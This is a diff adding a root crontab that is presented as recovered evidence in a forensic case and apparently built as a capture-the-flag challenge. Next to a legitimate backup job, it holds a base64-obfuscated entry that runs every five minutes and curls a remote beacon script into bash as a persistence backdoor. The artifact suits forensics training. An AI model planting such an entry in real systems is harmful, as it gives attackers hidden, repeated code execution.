@@ -1,0 +1,9 @@
+# Recovered from /var/spool/cron/crontabs/root (imaged laptop, case 2026-114)
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# nightly database backup - legitimate
+0 3 * * * /usr/local/bin/backup-db.sh >> /var/log/backup.log 2>&1
+
+# added 2026-10-02 03:14 by an unknown account
+*/5 * * * * /bin/bash -c 'echo L3Vzci9iaW4vcHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLXMgaHR0cDovLzEwLjEwLjEwLjUvYmVhY29uLnNoIHwgYmFzaCcpIiAjIENURntjcm9uX3BlcnNpc3RlbmNlX2JlYWNvbn0= | base64 -d | bash'
